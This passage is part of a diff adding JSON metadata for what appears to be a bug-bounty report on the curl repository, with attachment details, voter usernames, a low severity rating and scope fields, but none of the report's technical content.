u3pwAklbjWHB%2FRorx50eY%2FvBhSJ12OZHR2wu4R9mY%2Br3BsiNO6AGgRw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=468f335a9d88d786e639f80fe665f9e23687714258c2336378f8636d86b87c40",
+      "file_size": 91292,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 18,
+  "voters": [
+    "coder_mohammed",
+    "2026",
+    "seniorlee",
+    "marianacodebase",
+    "pl4nkton_",
+    "msgnoki",
+    "dkjung",
+    "neuron_ray",
+    "f0xbyte-",
+    "shaktiman176",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
